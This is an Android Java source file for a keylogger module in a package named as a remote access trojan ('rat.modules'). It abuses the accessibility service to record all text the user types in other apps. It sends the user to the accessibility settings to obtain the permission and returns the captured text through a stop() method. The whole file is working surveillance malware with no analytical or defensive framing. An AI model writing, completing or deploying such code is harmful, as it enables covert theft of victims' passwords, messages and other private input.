package com.xroomjx.rat.modules;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;

public class Keylogger extends AccessibilityService {
    private static StringBuilder log = new StringBuilder();
    private static boolean active = false;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (active && event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().toString();
            if (text != null && text.length() > 0) {
                log.append(text).append(" ");
            }
        }
    }

    @Override
    public void onInterrupt() {}

    public static void start(Context context) {
        active = true;
        log = new StringBuilder();
        // Requires accessibility permission
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public static String stop() {
        active = false;
        return log.toString();
    }
}
